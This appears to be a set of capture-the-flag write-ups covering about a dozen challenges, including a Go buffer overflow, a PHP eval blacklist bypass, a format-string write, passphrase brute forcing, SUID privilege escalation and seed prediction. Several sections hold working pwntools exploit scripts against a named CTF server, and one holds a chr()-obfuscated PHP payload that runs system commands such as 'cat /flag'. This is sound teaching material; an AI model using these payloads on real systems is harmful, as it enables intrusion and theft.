# ChatCTF

Downloading the support file, it reveals a `.pkl` file, which hints at it being pickled data. Using Python to unpickle it, reveals an array of numbers. Researching a bit and looking at the challenge's description (hints at using ChatGPT), I got to understand that these are tokens from GPT models. Fiddling around with GPT2Tokenizer, it doesn't work, thus I started searching for GPT3/4 decoders. Stumbled upon node module `gpt-tokenizer`, which did the job and decoded the text.

Decoded text hints at using: `https://github.com/openai/tiktoken` (good for the future)

Flag: `ACS_IXIA_CTF{as_a_large_language_model_i_cannot_pwn}`

# Lost Cassette

Sheesh, took me a while.
Analyzing the file in Ghidra firstly, nothing really pops out since it's a big file and has no symbols, Ghidra can't really handle it, though we see some artifacts hinting that it is using Golang. Opening it in IDA, we manage to get some proper function names. Reversing the file from `runtime_main` func, we eventually end up calling `sub_48BE00`, which has the prints and read (it reads 0x200 bytes, so it definitely overflows) we see when running the file, and, in there, we see a `cmp` with what we've entered against the char `*`, and then a function call. That function call (to `sub_48BD00`) does a ridiculous check at the beginning, and then will eventually end up calling `os_readFile` (idk what that check is, but in my attempts when inputting `*` I haven't managed to pass it, its `cmp rsp, [r14+10h]` which seems so random lmao), which is used to read a file, and specifically, it'll read the flag as instructed from the callee. After fiddling around trying to make the `true` branch of the `cmp` with `*`, I've decided to test other avenues, and explore the `false` branch. When looking at it, it sets up `rsp` and then does a `retn`, thus transforming this in a `ret2win` scenario, where I can call into the `sub_48BD00` (function that reads and prints the flag), somewhere after the checks and make it read and print the flag.
Fiddling around with the overflow (by debugging either in IDA or GDB, now that we know what address we need to put our breakpoint), we arrive at the fact that it takes 40 bytes to end up to where we need to overwrite the return address (namely, the location on the stack where `rsp` will point right before the `retn`). We just put the address of that func somewhere before the `os_readFile` call but after the checks that it does, and get the flag.

```Python
from pwn import *
payload = b"A" * 40 + p64(0x000000000048BD28)
#p = process("./lost_cassette")
p = remote("vmx.cs.pub.ro", 31400)
print(p.recv())
p.sendline(payload)
print(p.recv())

```

Flag:`ACS_KEYSIGHT_CTF{saf3r_th4n_cpp}`

# Exfiltr8

First of all, combine the provided files in a single tar and decompress it.
`cat exfiltr8_ddc70ca996cf3f1a22be523dcc6aa032_00.tar exfiltr8_ddc70ca996cf3f1a22be523dcc6aa032_01 > combined.tar && tar -xvf combined.tar`

Then, we see we have a `PCAP` file, and the challenge description says that there were some weird DNS queries, thus we filter for these in Wireshark.

Looking at the queries, we can see a series of weird queries having the format `hash.go0gle.com`. Researching the hash part, we see it is an MD5 hash, which we can reverse with any MD5 reverser online.

Doing that for each hash, in the order of it's appeareance, we get the text `Wh1t3_R0s3`. Wrapping it with the `ACS_KEYSIGHT_CTF{}` format, we get the flag.

Flag: `ACS_KEYSIGHT_CTF{Wh1t3_R0s3}`


# Elementary

Opening up few binaries in Ghidra, we can see that nothing much happens, it prints some stuff out, performs `atoi`, but nothing else. Looking at the assembly window, there are weird operations happening just before the `atoi` call: `mov edx, dword ptr [dat_00601040]; mov eax, dword ptr [dat_00601044]; xor eax,edx; mov dword ptr [rbp + local_c], eax`. Looking at the values in the data variables highlighted there, we see single byte values. Analzying more of the files, we can see that there are multiple operations performed apart from the xor, namely `sub edx, eax` and `add eax, edx`. Assuming that the data locations remain the same, we can just read the values from there, and then check what operation is being done: `0x01` coresponds for add, `0x29` for subb and `0x31` for XOR (opcodes).

Finally, put this all together in a script that reads those locations from the file and performs the required calculations.

```Python
from pwn import *
flag = ""
for i in range(1, 1271, 1):
	fn = "elementary" + str(i).zfill(4)
	e = ELF(fn)
	val1 = e.read(0x00601040, 4) # dat_00601040 - we could've also read the rva from lab_00400593 if it were to change - or also go from the entrypoint if that were to change it's address as well
	val1 = int.from_bytes(val1, "little")
	val2 = e.read(0x00601044, 4) # dat_00601044
	val2 = int.from_bytes(val2, "little")
	op = e.read(0x0040059f, 1) # location into lab_00400593 after the 2 mov's are performed, reading the first byte of the operation to be made
	print(op)
	if op == b")": # 0x29 - sub
		var = chr(val1 - val2)
		flag += var
	elif op == b"1": # 0x31 - xor
		var = chr(val1 ^ val2)
		flag += var
	elif op == b"\x01": # 0x01 - add
		var = chr(val1 + val2)
		flag += var
	else: # handler for other operations found
		print("found new op in file " + fn)
		break
print(flag)

```

Flag: `OWASPCTF{w0w_n1c3_rev_skillz_sheRl0ck}`

# LittleStar

`file` => `little_stars.png: GPG symmetrically encrypted data (AES256 cipher)`

```Python
import itertools
with open("wordlist", "r") as f:
	words = f.readlines()
words = [w.strip() for w in words]
substitutions = {
    'a': ['a', '@'], 'i': ['i', '1'], 'o': ['o', '0'], 'e': ['e', '3'], 's': ['s', '5']
}

def substitute(word):
    chars = []
    for char in word:
        if char in substitutions:
            chars.append(substitutions[char])
        else:
            chars.append([char])
    return set(''.join(variant) for variant in itertools.product(*chars))

all_variants = set(words)
for word in words:
    all_variants.update(substitute(word))
with open('wordlist_new.txt', 'w') as file:
    file.write('\n'.join(all_variants))

```

```sh
#!/bin/bash
encrypted_file="little_stars.png"
wordlist="wordlist_new.txt"
cd /home/kali/Desktop/little_star/
while read passphrase; do
    echo "Trying passphrase: $passphrase"
    echo $passphrase | gpg --batch --yes --passphrase-fd 0 --decrypt $encrypted_file > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Decryption successful with passphrase: $passphrase"
        echo $passphrase | gpg --batch --yes --passphrase-fd 0 --decrypt $encrypted_file > "decrypted_little_stars.png"
        break
    else
        echo "Decryption failed for passphrase: $passphrase"
    fi
done < "$wordlist"
```

`file decrypted` => `decrypted_little_stars.png: gzip compressed data, from Unix, original size modulo 2^32 18851840`

Opening the archives and stuff leads us to 999 files, `little_star_2.txt` up to `little_star_1000.txt`, which are actually ELF files.

Running `./little_star_*.txt` display a game of possibly warships? but idk how to play it

POST-CTF - apparently the solution was that 1 file out of the 999 files had a different sha, meaning it was different, and held the flag within -.-

# Culligan

Opening up the webpage, we see a simple PHP script that will do eval on the parameter `culligan`, having in place a big list of blacklisted commands. That list is easily bypassable if we use obfuscation via `chr`. Using this template `?culligan=$x=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$x();` we can run `system` for whatever command we want (the command needs to be encoded as well). After fiddling around running a `ls`, and then `ls /`, we can see that the flag is located in `/flag`. Using that template to run `cat /flag` gets us the flag: `?culligan=$x=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$x(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103));`

Flag: `ACS_IXIA_CTF{f1lt3rinG_mIghT_Not_be_dat_effectiv3}`

# bytel3ak

Upon first glance, I honestly had no idea what to do. That hint was a savior.
I started applying what the hint said, count the bits of 1 for each bit position in the ciphertext and aggregate them (add them up).
Then, knowing how the flag starts, namely `ACS_KEYSIGHT_CTF{`, I translated that into binary, and started fiddling around, looking at the counts of 1 for each of the bits and comparing them to the value in the count, and observed that 1 corresponds with a higher count, and whatever falls below that is 0. With a bit of fiddling around with the threshold, we obtain the flag.

Thinking in hind-sight, that should've been the approach from the beginning, seeing as how the `OR` operation preserves the bit 1 (it is 1 when either of the operands is 1), and as the ciphertext is obtained randomly, it should have a random distribution of 0s and 1s, thus the spikes would be caused by bits of 1 present in the plaintext, but it is what it is.


```Python
def bit_profile(ciphertext, length):
    profile = [0] * (length * 8)
    byte_array = bytearray.fromhex(ciphertext)
    for byte_index, byte in enumerate(byte_array):
        for bit_index in range(8):
            if byte & (1 << (7 - bit_index)):
                profile[byte_index * 8 + bit_index] += 1
    return profile

def aggregate_profiles(ciphertexts):
    length = len(bytearray.fromhex(ciphertexts[0]))
    aggregated = [0] * (length * 8)
    for ciphertext in ciphertexts:
        profile = bit_profile(ciphertext, length)
        for i in range(len(profile)):
            aggregated[i] += profile[i]
    return aggregated, length


def reconstruct_flag(aggregated, length, threshold):
    flag_bits = ['0'] * (length * 8)
    for i in range(length * 8):
        flag_bits[i] = '1' if aggregated[i] > threshold else '0'
    flag_bytes = []
    for i in range(0, len(flag_bits), 8):
        flag_bytes.append(int(''.join(flag_bits[i:i+8]), 2))
    return bytes(flag_bytes)

with open("ciphertexts.txt", "r") as f:
    ciphertexts = f.readlines()
ciphertexts = [c.strip() for c in ciphertexts]

aggregated, length = aggregate_profiles(ciphertexts)
print(*aggregated, sep='\n')
print(reconstruct_flag(aggregated, length, 50600))

```

Flag: `ACS_KEYSIGHT_CTF{W3ll_Th4t_t00k_s0m3_t1me_t0_tw34k}`

# Lost

Opening the binary in Ghidra, we see a short binary, which runs `fgets` for a 0x200 input, and then does a function call, which is just a wrapper from `printf`. As `printf` is called without any format specifiers and is called having the input our string, this is a format string vulnerability. Analyzing the code further, we see that we need to make a data variable equal to `0x1025544` in order to reach the branch where it opens the flag file and prints it out.
For a while I've been stuck trying to make the format string work, but realized that trying to first push the address wouldn't work as it contains 0x00 bytes. Did some digging (apparently it worked searching for `0x1025544` and `0x40408c` (addr of variable to be set)) and stumbled upon this one `https://karmanyaah.malhotra.cc/puzzles/2022/07/bcactf2/`, where it puts the address at the end, most probably due to the same concerns. So I did that and started fiddling around with the offset, with payloads like shown there `b"%9$lx " + b"A"*18 +p64(0x0040408c) + b"\n"`. I had to fiddle around with the number of A's used as padding and the offset of the variable, but eventually landed, for the test example, at offset 15 on the stack, and 17 A's. That allowed me to reference my written address on the stack. From there, I added the value `0x1025544` as decimal (16930116) and added `%n` to write that amount of characters and modified the amount of padding accordingly (to align my address properly).


```Python
from pwn import *
#p = gdb.debug("./lost/lost", "br *0x0040128a")
p = remote("vmx.cs.pub.ro", 31500)
payload = b"%15$16930116lx%15$n" + b"A"*5+ p64(0x40408c) + b"\n"
p.sendline(payload)
print(p.recv())
p.interactive()
```

Flag:`ACS_KEYSIGHT_CTF{d33p_in_the_dark}`

# Infected

We are given the private key to connect to ssh => `ssh -i my_key infected@vmx.cs.pub.ro`. In the challenge's description, it says something about SUID binaries, so let's filter for that `find / -perm /4000`. We see an interesting file in `/lib/.you/.will/.never.find/.me.hahah/b4ckd00r.bin`, we go to it, run `file`  and we get `b4ckd00r.bin: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, BuildID[sha1]=a5e3f35c9704d05401ecf89568dc33cfe79292b8, with debug_info, not stripped`. Bingo. Now, for transfering it to analyze it. I had problems using either `rsync` or `sftp` or `scp` due to some terminal issue, so I resorted to another method. I've noticed that there's `python` on the server, so I just read the file and printed it's bytes, copied them and then reconstructed the file on my machine. Analyzing it, it is a simple file, we see in the `main` function that it asks that `argc` is greater than 1, meaning that there's at least one command line argument, and that `argv[1]` is the `secret`. Running the b4ckd00r with the `secret` as a parameter, we get `root` (`./b4ckd00r.bin e8565c981da0c98f8349bd3dedbcfda3`. Now, we get the flag from `/root/flag`.

Flag: `ACS_IXIA_CTF{wh4ts_min3_15_m1ne}`

# Return 4

We are presented with a simple program, which generates a secret, and asks us to match that secret in order to get the flag. The secret is generated using the `rand()` function, which is seeded by the current time. Conveniently, the program also prints the time (H:m:s), allowing us to correctly reconstruct the timestamp that was seeded for the secret.

I wrote a simple C program that takes in a timestamp and follows the same steps as our provided program.
```C
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
int main(int argc, char **argv) {
    time_t seed_time = (time_t)atoi(argv[1]);
    srandom(seed_time);
    int secret = rand();
    printf("Secret: %d\n", secret);
    return 0;
}
```

The C program requires a timestamp, whereas the program provides us with the H:m:s format, so that can be fixed with a simple Python oneliner.

```Python
print(datetime.strptime('Sat Apr 13 21:07:25 2024', "%c").timestamp())
```

Then, just connect to the provided server, get the time, plug it in the python script and get the timestamp, then plug that into the C program and send the generated secret back to the server.

Flag: `ACS_KEYSIGHT_CTF{c2VlZHMgYXJlIGltcG9ydGFudAo}`

# Blockchain Whisperer

Simply explore the given website. The challenge's description says to check the smart contracts, so that's what we do. We check each deploy transaction, and we can inspect their code (`cyberchef -> From Hex`). In there (both will do), we can see the text `ACS_IXIA_CTF_BL0CKCH41N_WH1SP3R3R`. Modifying it a bit to adapt it to the flag format, we get the flag.

Flag: `ACS_IXIA_CTF{BL0CKCH41N_WH1SP3R3R}`